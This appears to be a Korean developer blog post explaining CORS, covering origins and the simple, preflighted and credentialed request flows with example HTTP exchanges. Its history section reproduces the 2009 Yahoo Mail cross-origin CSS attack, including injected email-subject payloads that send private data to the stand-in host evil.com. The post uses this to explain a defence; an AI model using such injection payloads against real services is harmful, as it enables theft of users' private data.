> 🚨 Access to fetch at ‘https://api.lubycon.com/me’ from origin ‘http://localhost:3000’ has been blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present on the requested resource. If an opaque response serves your needs, set the request’s mode to ‘no-cors’ to fetch the resource with CORS disabled.

개발을 하다보면 한번쯤 마주쳤을 메시지 입니다.
CORS를 위반했고, 'Access-Control-Allow-Origin' 헤더를 수정하거나 cors가 필요없는 요청을 하라는 해결방법을 알려주고 있습니다. 

**여기서 CORS는 무엇일까요?**

개념을 이해하는 방법 중 가장 좋은 방법은 왜 이 개념이 생겼는지 알아보는게 좋습니다.


## 왜 CORS가 생겼을까?
브라우저는 거의 30년 동안 다른 사이트의 이미지를 포함할 수 있었습니다. 다른 사이트의 허락을 받을 필요 없이 그냥 할 수 있었습니다. 이미지뿐만 아니라 다른 자원도 가져오는 것이 가능했습니다.

```html
<script src="…"></script>
<link rel="stylesheet" href="…" />
<iframe src="…"></iframe>
<video src="…"></video>
<audio src="…"></audio>
```

하지만 이런 방식은 1994년에 HTTP 쿠키 등장으로 복잡해지기 시작했습니다. **HTTP 헤더에 인증 정보가 포함이 되었기 때문입니다.**

서버는 HTTP 헤더의 인증 정보를 사용해서 사용자를 특정합니다. 

공격자는 이런 특정을 이용해서 취약점을 찾기 시작했습니다. 결과적으로, 2009년 야후 메일의 취약점이 밝혀졌습니다.

먼저, 공격자는 `');}`를 포함한 제목을 유저게 보낸 후 `{}html{background:url('//evil.com/?:`가 포함된 제목의 메일을 보냅니다.

그럼, 메일이 아래와 같은 구조로 전달될 것 입니다.
```html
…
<li class="email-subject">Hey {}html{background:url('//evil.com/?</li>
<li class="email-subject">…private data…</li>
<li class="email-subject">…private data…</li>
<li class="email-subject">…private data…</li>
<li class="email-subject">Yo ');}</li>
…
```

위 구조에서 공격자가 실행되기 원하는 코드는 유효한 CSS 구문 분석 대상 사이에 끼어 있습니다.

다음에 공격자는 사용자가 다음을 포함하는 페이지를 방문 하도록 유도합니다.

```html
<link rel="stylesheet" href="https://m.yahoo.com/mail" />
```

해당 자원이 `yahoo.com`의 쿠키를 이용해 로드되면 CSS 파서는 미리 심어두었던 메일 제목을 구문 분석하여 개인 정보를 `evil.com`에 보내게 됩니다.

서로 다른 사이트에 접근을 허용했을 때 발생할 수 있는 문제는 이것 말고도 다양합니다.

## 그래서 CORS 란?
위에서 서로 다른 사이트에 접근을 허용했을 때 문제가 발생한다는 것을 알게 되었습니다. 이런 문제를 해결하기 위한 방법 중 하나가 **CORS** 입니다.

CORS의 정의는 아래와 같습니다.
> 교차 출처 리소스 공유(Cross-Origin Resource Sharing, CORS)는 추가 HTTP 헤더를 사용하여, 한 출처에서 실행 중인 웹 애플리케이션이 다른 출처의 선택한 자원에 접근할 수 있는 권한을 부여하도록 브라우저에 알려주는 체제입니다.

간단히 이야기하면 CORS는 **브라우저**에서만 사용 되며, **같은 출처와 서버가 허용해준 출처**만이 자원에 접근할 수 있게 하는 정책입니다.

### 출처(Origin)?
출처라는 용어가 많이 나옵니다. 출처는 무엇일까요?

`www.google.com`같은 우리가 흔히 보는 URL은 여러개의 컴포넌트로 이루어져있습니다.

![](https://upload.wikimedia.org/wikipedia/commons/d/d6/URI_syntax_diagram.svg)

출처는 위의 구조에서 **scheme과 host, port를 합친 것**을 의미 합니다. 
`https://evan-moon.github.io`와 같은 출처는 인정되는 예시는 아래와 같습니다.


|                    URL                    | 같은 출처 | 이유                      |
|:-----------------------------------------:|:-----------:|-----------------------------|
| https://evan-moon.github.io/about         | O           | 스킴, 호스트, 포트가 동일   |
| https://evan-moon.github.io/about?q=안뇽  | O           | 스킴, 호스트, 포트가 동일   |
| https://user:password@evan-moon.github.io | O           | 스킴, 호스트, 포트가 동일   |
| http://evan-moon.github.io                | X           | 스킴이 다름                 |
| https://api.github.io                     | X           | 호스트가 다름               |
| https://evan-moon.naver.com               | X           | 호스트가 다름               |
| https://evan-moon.github.com              | X           | 호스트가 다름               |
| https://evan-moon.github.io:8000          | ?           | 브라우저의 구현에 따라 다름 |


## 언제, 어떻게 CORS가 사용되나?
그래서 CORS는 언제, 어떻게 사용이 될까요?

### CORS를 사용하는 요청
아래 HTTP 요청에 대해서 CORS는 동작합니다.
- XMLHttpRequest나 Fetch APIs를 호출하는 경우
- Web Fonts의 경우
- WebGL textures의 경우
- `drawImage()`를 사용해 canvas에 Image/Video 프레임을 그리는 경우
- CSS Shaped from images의 경우

### CORS 시나리오
CORS와 관련된 시나리오는 총 3가지가 있습니다. 

### Simple Request
특정 조건을 가진 요청은 CORS가 필요하지 않습니다. 이 요청을 우리는 `Simple Request`라고 부릅니다.

Simple Request의 조건은 아래와 같습니다.
- `GET`, `HEAD`, `POST` 방법 중 하나
- user agent에 의해서 자동으로 설정되는 헤더 외에 manually로 설정할 수 있는 헤더는 아래와 같습니다.
    - `Accept`, `Accept-Language`, `Content-Language`, `Content-Type`
- 허용되는 media type은 아래와 같습니다.
    -  `applicatoin/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`
- 만약 요청이 `XMLHttpRequest`로 의해 만들어졌다면, 이벤트 리스너가 등록되어 있지 않아야 합니다.
- `ReadableStream` 객체를 request에서 사용하면 안됩니다.


```js
const xhr = new XMLHttpRequest();
const url = 'https://bar.other/resources/public-data/';

xhr.open('GET', url);
xhr.onreadystatechange = someHandler;
xhr.send();
```

```html
GET /resources/public-data/ HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Connection: keep-alive
Origin: https://foo.example
```

### Preflighted requests
simple request와 달리 본 요청 전에 `OPTIONS` 방법을 사용하여 HTTP 요청을 보내 본 요청이 안전하지 확인 합니다. 

```js
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```

```html
OPTIONS /doc HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Connection: keep-alive
Origin: https://foo.example
Access-Control-Request-Method: POST
Access-Control-Request-Headers: X-PINGOTHER, Content-Type

HTTP/1.1 204 No Content
Date: Mon, 01 Dec 2008 01:15:39 GMT
Server: Apache/2
Access-Control-Allow-Origin: https://foo.example
Access-Control-Allow-Methods: POST, GET, OPTIONS
Access-Control-Allow-Headers: X-PINGOTHER, Content-Type
Access-Control-Max-Age: 86400
Vary: Accept-Encoding, Origin
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
```

line 1-10은 preflight request를 이야기 합니다. 브라우저는 preflight를 통해서 본 요청이 가능한지 확인 합니다. preflight는 본 요청에 필요한 정보도 미리 보냅니다. 9-10 라인

`Access-Control-Request-Method` 는 메소드를 `Access-Control-Request-Header`는 본 요청에 커스텀 헤더에 대한 정보가 포함됩니다. 

line 13-22는 서버가 전달해준 response 입니다. `Access-Control-Allow-Origin`에는 `https://foo.examlple`이 포함되어 있습니다.

`Access-Control-*`에 대한 설명

본 요청에 대한 request와 response는 아래와 같다.

```html
POST /doc HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Connection: keep-alive
X-PINGOTHER: pingpong
Content-Type: text/xml; charset=UTF-8
Referer: https://foo.example/examples/preflightInvocation.html
Content-Length: 55
Origin: https://foo.example
Pragma: no-cache
Cache-Control: no-cache

<person><name>Arun</name></person>

HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 01:15:40 GMT
Server: Apache/2
Access-Control-Allow-Origin: https://foo.example
Vary: Accept-Encoding, Origin
Content-Encoding: gzip
Content-Length: 235
Keep-Alive: timeout=2, max=99
Connection: Keep-Alive
Content-Type: text/plain

[Some XML payload]
```

### Requests with credentials
인증정보를 포함하는 요청은 CORS를 더 강화한 요청입니다. 

기본적으로 브라우저가 제공하는 AJAX API인 `XMLHttpRequst` 객체나 `fetch` API는 쿠키 정보나 인증과 관련된 헤더를 요청에 포함하지 않습니다. 이때 요청에 인증과 관련된 정보를 담을 수 있게 해주는 옵션이 `credntials`옵션 입니다.

```js
const invocation = new XMLHttpRequest();
const url = 'http://bar.other/resources/credentialed-content/';

function callOtherDomain() {
  if (invocation) {
    invocation.open('GET', url, true);
    invocation.withCredentials = true;
    invocation.onreadystatechange = handler;
    invocation.send();
  }
}
```

`invocatoin.withCredentials`는 인증 정보를 쿠키에 포함한다는 플래그 입니다. 위 요청은 `simple request` 이지만 브라우저는 `Access-Control-Allow-Credentials : true` 헤더가 없는 응답을 거부합니다.

```html
GET /resources/credentialed-content/ HTTP/1.1
Host: bar.other
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-us,en;q=0.5
Accept-Encoding: gzip,deflate
Connection: keep-alive
Referer: http://foo.example/examples/credential.html
Origin: http://foo.example
Cookie: pageAccess=2


HTTP/1.1 200 OK
Date: Mon, 01 Dec 2008 01:34:52 GMT
Server: Apache/2
Access-Control-Allow-Origin: https://foo.example
Access-Control-Allow-Credentials: true
Cache-Control: no-cache
Pragma: no-cache
Set-Cookie: pageAccess=3; expires=Wed, 31-Dec-2008 01:34:53 GMT
Vary: Accept-Encoding, Origin
Content-Encoding: gzip
Content-Length: 106
Keep-Alive: timeout=2, max=100
Connection: Keep-Alive
Content-Type: text/plain


[text/plain payload]
```

## 참고자료
- https://en.wikipedia.org/wiki/Cross-origin_resource_sharing
- https://ui.toast.com/weekly-pick/ko_20211110
- https://developer.mozilla.org/ko/docs/Web/HTTP/CORS
- https://evan-moon.github.io/2020/05/21/about-cors/